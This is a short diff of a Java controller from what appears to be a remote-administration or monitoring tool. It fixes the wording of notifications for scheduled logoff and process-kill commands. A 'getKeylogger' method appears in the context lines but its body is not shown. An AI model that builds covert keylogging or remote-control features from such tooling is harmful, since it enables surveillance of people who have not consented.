@@ -43,14 +43,14 @@ public class Controller {
     private static String shutdown(JSON input) {
         long countdown = input.getLong("countdown");
         Client.getExecutorService().schedule(() -> logoff(), countdown, TimeUnit.MINUTES);
-        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_NOTIFICATION).put("notification", "Client's computer will be logoff in " + cd + "minutes").json();
+        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_NOTIFICATION).put("notification", "Client's computer will be logoff in " + countdown + " minutes").json();
     }
 
     private static String endProcess(JSON input) {
         Integer pid = input.getInt("pid");
         long countdown = input.getLong("countdown");
         Client.getExecutorService().schedule(() -> ProcessHandle.of(pid).ifPresent(ProcessHandle::destroy), countdown, TimeUnit.MINUTES);
-        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_NOTIFICATION).put("notification", pid + " will be shutdown in " + countdown + "minutes").json();
+        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_NOTIFICATION).put("notification", pid + " will be shutdown in " + countdown + " minutes").json();
     }
 
     private static String getKeylogger(JSON input) {
